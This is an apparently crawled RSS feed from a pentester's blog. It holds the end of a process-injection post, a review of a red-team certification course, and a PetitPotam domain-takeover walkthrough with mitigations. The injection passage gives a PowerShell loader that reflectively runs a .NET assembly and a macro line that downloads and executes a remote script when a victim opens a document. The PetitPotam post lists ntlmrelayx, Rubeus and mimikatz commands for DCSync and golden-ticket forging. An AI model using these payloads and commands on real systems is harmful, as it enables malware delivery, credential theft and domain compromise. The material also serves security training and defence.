</span></span><span style="display:flex;"><span>$b64Zipped = [<span style="color:#66d9ef">System.Convert</span>]::ToBase64String($outBytes)
</span></span><span style="display:flex;"><span>$b64Zipped | Out-File -NoNewLine -Encoding ASCII .\compressedEncodedBytes.txt<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span></code></pre></div><p>Create a PowerShell script to decode this compressed and encoded bytestream.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>$a = New-Object System.IO.MemoryStream(, [<span style="color:#66d9ef">System.Convert</span>]::FromBase64String(<span style="color:#e6db74">&#34;compressed and encoded bytestream here&#34;</span>))
</span></span><span style="display:flex;"><span>$b = New-Object System.IO.Compression.GZipStream($a, [<span style="color:#66d9ef">System.IO.Compression.CompressionMode</span>]::Decompress)
</span></span><span style="display:flex;"><span>$c = New-Object System.IO.MemoryStream;
</span></span><span style="display:flex;"><span>$b.CopyTo($c)
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">byte[]</span>]$d = $c.ToArray()
</span></span><span style="display:flex;"><span>$e = [<span style="color:#66d9ef">System.Reflection.Assembly</span>]::Load($d)
</span></span><span style="display:flex;"><span>$f = [<span style="color:#66d9ef">System.Console</span>]::Out
</span></span><span style="display:flex;"><span>$g = New-Object System.IO.StringWriter
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.Console</span>]::SetOut($g)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$h = [<span style="color:#66d9ef">Reflection.BindingFlags</span>]<span style="color:#e6db74">&#34;Public,NonPublic,Static&#34;</span>
</span></span><span style="display:flex;"><span>$i = $e.GetType(<span style="color:#e6db74">&#34;injection.Program&#34;</span>, $h)
</span></span><span style="display:flex;"><span>$j = $i.GetMethod(<span style="color:#e6db74">&#34;Main&#34;</span>, $h)
</span></span><span style="display:flex;"><span>$j.Invoke($null, (, [<span style="color:#66d9ef">string[]</span>]$args))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.Console</span>]::SetOut($f)
</span></span><span style="display:flex;"><span>$k = $g.ToString()
</span></span><span style="display:flex;"><span>$k
</span></span></code></pre></div><p>Get this PowerShell script to be loaded and executed via an Office macro, something like:</p>
<pre tabindex="0"><code class="language-Visual" data-lang="Visual">Dim str As String
    walk = &#34;powershell iex (iwr http://hostingserver/notmalicious.ps1 -Useb)&#34;
    CreateObject(&#34;Wscript.Shell&#34;).Run walk, 0
</code></pre><p>When the victim opens the maldoc and enables macro, WINWORD will load our PowerShell script, decode, decompress and reflectively run the .NET Assembly.</p>
<p>
    <img src="/images/earlybird_injection.png"  alt="inject into svchost.exe"  class="center"  style="border-radius: 8px;"  />


<em>Process injection into svchost.exe</em></p>
<p>
    <img src="/images/not_caught_by_getInjectedThread.png"  alt="Get-InjectedThread could no longer detect our injection"  class="center"  style="border-radius: 8px;"  />


<em>Get-InjectedThread could no longer detect our injection</em></p>
<h2 id="is-this-good-enough">Is this good enough?</h2>
<p>Well no, modern AV/EDR can still nuke our work immediately, this is mainly to demonstrate a common injection technique implemented with D/Invoke.
In Part 2, we can make our <code>svchost.exe</code> malware even more benign by PPID Spoofing, making it appear as it got spawned by <code>services.exe</code>, which is normally the case. I&rsquo;m also working on invoking system calls with D/Invoke instead of standard API calls to defeat API Hooking. Stay tuned!</p>
]]></content></item><item><title>Certified Red Team Operator (CRTO) by Zero Point Security Review</title><link>https://jakemai0.github.io/posts/crto/</link><pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate><guid>https://jakemai0.github.io/posts/crto/</guid><description>Introduction Red Team Ops is a course offered by Zero Point Security, which serves as an Introduction to Red Teaming with a focus on the use of Cobalt Strike C2. When the students finish the course and pass the 48 hour exam (don&amp;rsquo;t worry, it&amp;rsquo;s not like the 300 level courses by OffSec), the students will receive the &amp;ldquo;Certified Red Team Operator&amp;rdquo; certification. If you&amp;rsquo;re new to the community, Zero Point Security is a one-man company created and operated by Daniel Duggan aka RastaMouse.</description><content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p><a href="https://courses.zeropointsecurity.co.uk/courses/red-team-ops">Red Team Ops</a> is a course offered by Zero Point Security, which serves as an Introduction to Red Teaming with a focus on the use of <a href="https://www.cobaltstrike.com/">Cobalt Strike</a> C2. When the students finish the course and pass the 48 hour exam (don&rsquo;t worry, it&rsquo;s not like the 300 level courses by OffSec), the students will receive the &ldquo;Certified Red Team Operator&rdquo; certification.
If you&rsquo;re new to the community, Zero Point Security is a one-man company created and operated by Daniel Duggan aka <a href="https://twitter.com/_rastamouse?lang=en">RastaMouse</a>. He is well known in the infosec community for many of his contributions such as the open-source C2 <a href="https://github.com/SharpC2/SharpC2">SharpC2</a>, the <a href="https://app.hackthebox.com/prolabs/overview/rastalabs">RastaLabs</a> ProLab on HackTheBox, the <a href="https://courses.zeropointsecurity.co.uk/courses/c2-development-in-csharp">C2 Development in C#</a> course, the <a href="https://courses.zeropointsecurity.co.uk/courses/offensive-driver-development">Offensive Driver Development</a> course and the RTO course that I will be talking about.</p>
<p>In this post I will be going over my experience with the course and the exam, what I think about this course and whether you should be taking it or not (spoiler: yes, you should).</p>
<h2 id="my-background">My Background</h2>
<p>I am still a fresh noob when it comes to the Offensive Security domain, with less than a year of experience as a pentester at the time of writing this. I did however have prior experience working as a SOC analyst, so I joined the Red side with a hint of Blue, and this has benefited me greatly (I&rsquo;ll get to that part later). I had my OSCP and CRTP in November 2021 and January 2022 respectively, my knowledge and skills could barely scratch the surface when it comes to Pentesting/Red Teaming, but at least I consider myself somewhat competent with &ldquo;how to computer&rdquo;.
I&rsquo;ve always wanted to dive into Red Teaming and Adversary Emulation, so after CRTP, CRTO was next on my checklist.</p>
<h2 id="the-course-material-and-lab-experience">The Course Material and Lab Experience</h2>
<p>The course content was absolutely amazing, it goes over from the basic &ldquo;high level&rdquo; of what is Red Teaming, what is a C2, Reconnaissance, Initial Compromise, to full Domain Takeover.</p>
<p>I enjoyed the &ldquo;high level&rdquo; theory part of Red Teaming more than I thought I did, so I went ahead and bought the book <a href="https://www.amazon.com/Red-Team-Development-Operations-practical/dp/B083XVG633">Red Team Development and Operations</a> by Joe Vest and James Tubberville. This is an amazing book and probably a must-read if you want to get into Red Teaming.
There are 26 modules in the course so I won&rsquo;t be able to go over each of them here, but here are the highlights of the course in my opinion.</p>
<h3 id="cobalt-strike">Cobalt Strike</h3>
<p>What&rsquo;s not to love about getting your hands on one of the best C2 frameworks out there. <a href="https://www.cobaltstrike.com/">Cobalt Strike</a> was originally created by Raphael Mudge back in 2012, it is now  maintained by Help System and is still considered to be one of the best C2 frameworks due to its powerful and robust capabilities. I&rsquo;ve never gotten a chance to use Cobalt Strike or any of the C2 framework before, so this was an eye-opening experience. Since the course focuses on the use of C2, everything you do will be via Cobalt Strike, from catching the first beacon from a macro-embedded Word doc, host privsec, lateral movement, pivoting, tunneling, to getting DA and EA.

    <img src="/images/cs.png"  alt="Cobalt Strike in action"  class="center"  style="border-radius: 8px;"  />


<em>Cobalt Strike in action</em></p>
<p>The course also touches on some basic AV Evasion for Cobalt Strike payloads, by teaching you how to modify the artifact-kit and resource-kit to bypass AV on the target machines (not EDR evasion unfortunately, RastaMouse did hint that this topic would be covered in RTO2, so I guess we&rsquo;ll see). Another cool feature of Cobalt Strike is Malleable C2 Profile, it gives the Operators total control of the beacon&rsquo;s indicators such as network and in-memory artifacts, HTTP(S) requests coming in and out, everything is fully customisable. This feature can make Cobalt Strike much harder to detect, and can also be used to emulate the TTPs of a particular APT in an Red Team Engagement.</p>
<h3 id="kibana">Kibana</h3>
<p>Ah, flashback to the SOC days. In previous verisons of the lab, Splunk was the predecessor, however, the new lab uses ELK as a mini &lsquo;SIEM&rsquo;. In my opinion, this is a great feature and a selling point for RTO. Yes, attacking a network is cool but what&rsquo;s cooler is you get to see what&rsquo;s going on on the other side of the fence, you get to see what the Blue Team Operators see. Combining with the #OPSEC tips and tricks, I got to see what event Windows generates via Kibana when you launch an attack, why is this particular technique is considered bad #OPSEC and what should you do instead to be more stealth.
I had many &ldquo;Ahhhhhh&rdquo; moments as I was going through the course and looking at the Kibana console, I&rsquo;d be lying if I say I knew 100% what each event meant and why they were there when I was a SOC analyst. But now from an attacker perspective, it all made sense. This is why I strongly believe that to be a good Red Team Operator, you also need to be a good Blue Team Analyst and vice versa. It&rsquo;s Art of War all over again, &ldquo;Knowing Your Enemy&rdquo;.

    <img src="/images/kibana.png"  alt="Kibana"  class="center"  style="border-radius: 8px;"  />


<em>Kibana console</em></p>
<p>A small issue I encountered was, sometimes, the winlogbeat sensor did not work properly on some machines and I ended up not seeing any events being ingested.</p>
<h3 id="active-directory-exploitation">Active Directory Exploitation</h3>
<p>Windows Active Directory Exploitation was the bulk of the course. I felt like CRTP was a great primer for me, without any practical AD experience before, it taught me basic understanding of AD hacking. This time, I got to do it all over again with Cobalt Strike. However, that doesn&rsquo;t mean that I didn&rsquo;t learn anything new. The AD Exploitation modules on RTO really reinforced my skills and taught me new techniques on Lateral Movement, Reverse Port Forwarding, Pivoting, DPAPI, GPO Abuses, DCAL Abuses, LAPS and Active Directory Certificate Services (ADCS).</p>
<p>The section on ADCS was absolute gold, thanks to it, I was able to compromise DA in a recent internal pentest by abusing NTLM Relay via ADCS (PetitPotam attack). I will make a detailed post on this in a few weeks.</p>
<h3 id="the-lab">The Lab</h3>
<p>The lab for RTO was hosted on SnapLab, overall, it was a smooth experience for me. Everything was done via a web portal using Guacamole Apache, you connect to the lab directly through it. All tools were provided on the attacker-machine, it was a complete sandboxed environment to protect Cobalt Strike&rsquo;s license (understandable). There was no flag to collect in the unlike the previous versions of the lab. It was designed so that you can follow a long the examples in the course material and experiment with different techniques and tactics, more like an &ldquo;Open World&rdquo; lab ;)</p>
<p>Also, the lab is private and you would not have to share it with others. Phew!</p>
<h3 id="pricing-and-support">Pricing and Support</h3>
<p>RTO was relatively cheap when you compare it to other big players in the game like Offensive Security, SANS and INE. I bought the RTO bundle including the course and 40 hours of lab time for £399 (if you buy the lab time separately, it is £1.25 per hour). I finished the course and the exam and still had about 10 hours of lab time remaning, which I still have access to. Based on what provided, this was an absolute bargain, not to mention, you have lifetime access to the course material and its future updates.</p>
<p>For support, since RastaMouse in the CEO, Content Manager, Lab Maintainer as well as Student Support Officer, he might be overwhelmed with emails and queries. RTO&rsquo;s <a href="https://discord.com/invite/FBgTXB45?utm_source=Discord%20Widget&amp;utm_medium=Connect">Discord</a> server is the place to go for real time support. You will have RastaMouse himself answering your questions, when he is unable too, you have heaps of other knowledgable members in the chat to help you out. It is also a good place for banters :)</p>
<h2 id="exam">Exam</h2>
<p>The exam was a roller coaster for me. I booked to sit the exam on Good Friday, so that I could make good use of the Easter long weekend. After booking the exam, you would receive a PDF containing the TTPs you need to emulate using Malleable C2 Profile along with customised tactical approach. The exam is a 4-day event for 48 hours (you have 48 hours to do the exam, and the result will come out after 4 days), the best thing is you can pause the exam anytime you want for breaks, 48 hours is a lot of time so make sure you eat and sleep well for a fresh mind. The final goal of the exam is to reach an external domain, and to pass you will need to collect 6/8 flags, you also don&rsquo;t need to submit a report, which is a nice change of wind.</p>
<p>My first day did not go so well, I got 2 flags in the first 4 hours, and got stuck for the next 7 hours. I thought I&rsquo;ve tried everything, I didn&rsquo;t know what I was missing. Frustrated, I went to bed, next day I spent the whole day playing Squash, had dinner with friends and played Mario Kart :&rsquo;). I think I just needed a break. Picked up where I left off on Sunday, I finally got my third flag, then fourth. &ldquo;They&rsquo;re falling like Dominoes now&rdquo; I told myself, it was all fun and games until flag 6, the passing flag. I went full r*tard and reset the firewall setting on one box, what could go wrong right? It effectively killed a very important beacon in the compromise chain, and I completely lost connection to that machine. I was pulling my hair out.</p>
<p>Oh well, I had 26 hours left, so I reverted everything and started from square one. Took me a while to get to the point I was before, and yes, I finally got flag 6 at 2am. Had a bit too much coffee by then so I tried grinding out the next 2 flags, and managed to get 8/8 at 4.30am after 20 hours straight :&rsquo;).

    <img src="/images/exam.png"  alt="Exam Timeline"  class="center"  style="border-radius: 8px;"  />


<em>My exam timeline</em>

    <img src="/images/cert.png"  alt="Exam Timeline"  class="left"  style="border-radius: 8px;"  />


<em>Another one to the collection</em></p>
<h2 id="final-thoughts">Final Thoughts</h2>
<p>For me, RTO was the best course I&rsquo;ve ever taken so far, material was top notch, great lab experience, and I actually enjoyed doing the course. Can&rsquo;t wait for RTO2 :)
<br>
I will start OffShore ProLab on HackTheBox in a week or two, now I&rsquo;ve got the knowledge, let&rsquo;s put it into the test and gain some more skills! After that, OSEP is next on my list.</p>
<p>Should you take this course? <strong>Yes!!</strong>
<br>
Are you a pentester who wants to step up your AD and internal network testing game? <strong>Big Yes</strong>
<br>
Are you wanting to transit to Red Teaming? <strong>Ohhh Yesss!</strong>
<br>
Are you a Blue Team Operator/SOC Analyst who wants to use the knowledge from the Offensive side to reinforce your Defending/Detection game? <strong>Heck Yes!</strong>
<br>
Are you not in Tech at all and having no clue how you got here? <strong>Um, maybe not CRTO yet, but if you think this sounds cool, start hacking :&quot;)</strong></p>
]]></content></item><item><title>Pwning Domain Admin with PetitPotam</title><link>https://jakemai0.github.io/posts/petitpotam/</link><pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate><guid>https://jakemai0.github.io/posts/petitpotam/</guid><description>Disclaimer: Original research was done by Will Schroeder and Lee Christensen in their Certified Pre-Owned whitepaper.
PetitPotam PoC was written by Lionel Gilles.
Introduction In a recent network pentest, I found an ADCS CA (Active Directory Certificate Services Certificate Authortity) on the target domain. I haven&amp;rsquo;t gotten a chance to play around with ADCS before, but I did remember reading about one attack technique called PetitPotam that abuses NTLM Relay via ADCS to take over the domain.</description><content type="html"><![CDATA[<p><strong>Disclaimer:</strong>
Original research was done by <a href="https://twitter.com/harmj0y">Will Schroeder</a> and <a href="https://twitter.com/tifkin_">Lee Christensen</a> in their <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified Pre-Owned</a> whitepaper.</p>
<p><a href="https://github.com/topotam/PetitPotam">PetitPotam</a> PoC was written by <a href="https://twitter.com/topotam77">Lionel Gilles</a>.</p>
<h2 id="introduction">Introduction</h2>
<p>In a recent network pentest, I found an ADCS CA (Active Directory Certificate Services Certificate Authortity) on the target domain. I haven&rsquo;t gotten a chance to play around with ADCS before, but I did remember reading about one attack technique called <a href="https://github.com/topotam/PetitPotam">PetitPotam</a> that abuses NTLM Relay via ADCS to take over the domain. After some time reading up about the technique and getting my hands dirty, I have successfully compromised DA! This blog post will be a quick rundown of how I got DA using this attack.</p>
<h3 id="active-directory-certificate-services">Active Directory Certificate Services</h3>
<p>At a high level, ADCS is a server role in Windows Active Directory that allows users to build a Public Key Infrastructure (PKI). This means that it can provide digital certificates and digital signature capabilities, improving confidentiality via encryption and integrity via digital signatures. The practical applications of ADCS are SSL/TLS, VPN (Virtual Private Network), IPSec (Internet Protocol Security), EFS (Encrypting File System), Smart Card logon, and more.</p>
<h3 id="petitpotam">PetitPotam</h3>
<p>PetitPotam is an attack technique that abuses NTLM Relay via ADCS CA with Web Enrollment enabled by exploiting the MS-EFSRPC (Encrypting File System Remote Protocol). This technique allows an <strong>unauthenticated</strong> attacker in the internal network to force the Domain Controller (DC) machine account to authenticate towards a machine with NTLM relay configured (the attacker machine). This authentication will then be relayed to the CA Web Enrollment to request for a certificate as the DC. This certificate can be captured and be used to request for a TGT as the DC machine account. With this TGT, Mimikatz can be used to dump credentials of the DA or the krbtgt account to fully compromise the Active Directory environment.</p>
<h2 id="action">Action</h2>
<p>From the foothold domain machine, I did some enumeration and was able to locate a CA in the domain. A native Windows tool called <code>certutil.exe</code> or <a href="https://github.com/GhostPack/Certify">Certify</a> can be used for this purpose. Certify is a C# tool to enumerate and abuse misconfigurations in ADCS, this tool can also be used to look for vulnerable certificate templates. Misconfiguration in certificate templates can lead to privilege escaltion, unfortunately, no vulnerable template was identified.

    <img src="/images/CA_.png"  alt="CA"  class="left"  style="border-radius: 8px;"  />


<em>Identified CA</em></p>
<p>With this, I was able to launch the ADCS Relay attack. The idea is to corece the DC to connect to the attacker machine, then relay the credential of the DC machine account to the ADCS server and request for a certificate (on behalf on the DC$). With this certificate, we can request for a TGT as the DC, and proceed to pwn the whole environment.</p>
<p>From the attacker box, launch <code>ntlmrelayx.py</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ntlmrelayx.py -debug -smb2support --target https://ca-hostname/certsrv/certfnsh.asp --adcs --template domaincontroller
</span></span></code></pre></div><p>The <code>--template</code> argument would depend on the account that would be relayed. Since I was relaying a DC, then the template should be <code>domaincontroller</code>, you could enumerate the template on the ADCS using Certify: <code>Certify.exe cas</code></p>
<p>On another window on the attacker box, launch <a href="https://github.com/topotam/PetitPotam">PetitPotam</a> against the DC:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo python3 petitpotam.py &lt;Attack box<span style="color:#e6db74">&#39;s IP&gt; &lt;DC&#39;</span>s IP&gt;
</span></span></code></pre></div><p>The attack was successful, on the ntlmrelayx window, a Base64 encoded certificate of the DC machine account was captured:

    <img src="/images/b64cert.png"  alt="certfnsh.asp"  class="left"  style="border-radius: 8px;"  />


<em>Base64 certificate of DC$</em></p>
<p>From here, I proceeded with requesting for a TGT of DC$ using <code>Rubeus</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>DC$ /domain<span style="color:#960050;background-color:#1e0010">:</span>&lt;domain&gt; /certificate<span style="color:#960050;background-color:#1e0010">:</span>&lt;base64-certificate&gt; /ptt
</span></span></code></pre></div><p>With the <code>/ptt</code> option, the returned TGT of DC$ would be imported into my current user session.
<br>
From here, a threat actor can aim for the highest prize by dumping the AES256 encryption key of the krbtgt account to forge a Golden Ticket:
Launch Mimikatz and dump the AES256 encryption key:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># From mimikatz:</span>
</span></span><span style="display:flex;"><span>lsadump::dcsync /domain<span style="color:#960050;background-color:#1e0010">:</span>&lt;domain&gt; /user<span style="color:#960050;background-color:#1e0010">:</span>krbtgt
</span></span></code></pre></div><p>Once the AES256 encryption key of the krbtgt account has been captured, the Golden Ticket could be forged:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># From Mimikatz:</span>
</span></span><span style="display:flex;"><span>kerberos::golden /user<span style="color:#960050;background-color:#1e0010">:</span>Administrator /domain<span style="color:#960050;background-color:#1e0010">:</span>&lt;domain&gt; /sid<span style="color:#960050;background-color:#1e0010">:</span>&lt;SID of the domain&gt; /aes256<span style="color:#960050;background-color:#1e0010">:</span>&lt;aes256 key&gt; /ticket<span style="color:#960050;background-color:#1e0010">:</span>goldie.kirbi
</span></span></code></pre></div><p>Proceed to inject the Golden Ticket:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Rubeus.exe ptt /ticket<span style="color:#960050;background-color:#1e0010">:</span>goldie.kirbi
</span></span></code></pre></div><p>GG!</p>
<h2 id="mitigation">Mitigation</h2>
<p>The misconfiguration has been mitigated immediately by enabling Extended Protection for Authentication (EPA) for CA Web Enrollment and Certificate Enrollment Web Service.</p>
<p>Addition mitigations that are recommended by Microsoft are:</p>
<ul>
<li>Disable NTLM Authentication on Windows Domain Controllers.</li>
<li>Disable NTLM on any ADCS server using Group Policy.</li>
<li>Disable NTLM for Internet Information Services (IIS) on AD CS Servers in the domain running the &ldquo;Certificate Authority Web Enrollment&rdquo; or &ldquo;Certificate Enrollment Web Service&rdquo; services.
\</li>
</ul>
<p>More information can be found <a href="https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429?ranMID=46131&amp;ranEAID=a1LgFw09t88&amp;ranSiteID=a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA&amp;epi=a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA&amp;irgwc=1&amp;OCID=AID2200057_aff_7806_1243925&amp;tduid=%28ir__pbc1z9tr09kf62lfkn9aaeqtum2xtbsisdfgml0c00%29%287806%29%281243925%29%28a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA%29%28%29&amp;irclickid=_pbc1z9tr09kf62lfkn9aaeqtum2xtbsisdfgml0c00">here</a></p>
]]></content></item></channel></rss>